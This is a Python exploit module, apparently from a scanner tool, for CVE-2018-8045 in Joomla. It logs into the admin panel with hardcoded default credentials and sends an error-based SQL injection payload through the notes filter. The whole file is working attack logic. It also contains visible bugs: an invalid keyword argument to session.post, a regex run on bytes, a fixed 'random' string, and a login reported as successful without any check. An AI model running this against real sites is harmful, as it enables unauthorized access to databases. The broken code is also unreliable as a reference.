# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2018-8045

import re
import hashlib
import requests
from colorama import Fore, Style, init
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

author = 'TrixSec'

def get_pass(profile_url):
    user = 'admin'
    passwd = 'password123'
    login_profile_url = urljoin(profile_url, '/administrator/index.php')
    session = requests.Session()
    content = session.get(login_profile_url).content

    re_para = r'<input type="hidden" name="return" value="(.*?)"/>.*<input type="hidden" name="(.*?)" value="1" />'
    match = re.findall(re_para, content, re.S)

    if match:
        value, token = match[0][0], match[0][1]
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        pass_payload = f'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'
        session.post(profile_url=login_profile_url, headers=headers, data=pass_payload, verify=False)
        print(f"{Fore.GREEN}{Style.BRIGHT}Admin Login Successful!{Style.RESET_ALL}")
        return session, headers
    else:
        print(f"{Fore.RED}{Style.BRIGHT}Failed to retrieve CSRF token or login details.{Style.RESET_ALL}")
        return None, None

def execute_sqli(profile_url, session, headers):
    rand_str = ''.join([str(i) for i in range(10)]) 
    sqli_profile_url = urljoin(profile_url, '/administrator/index.php?option=com_users&view=notes')
    sqli_payload = f'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({rand_str}))),0))'

    r = session.post(profile_url=sqli_profile_url, headers=headers, data=sqli_payload, verify=False)
    if r.status_code == 500 and hashlib.md5(rand_str.encode()).hexdigest()[:31] in r.content.decode():
        print(f"{Fore.GREEN}{Style.BRIGHT}SQL Injection Successful! Exploit profile_url: {sqli_profile_url}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}SQL Injection Failed!{Style.RESET_ALL}")

def scan_cve_2018_8045(target):
    print(f"{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}")
    session, headers = get_pass(target)

    if session and headers:
        execute_sqli(target, session, headers)
    else:
        return False  # Added return here if login fails

    return True  # Indicate successful execution
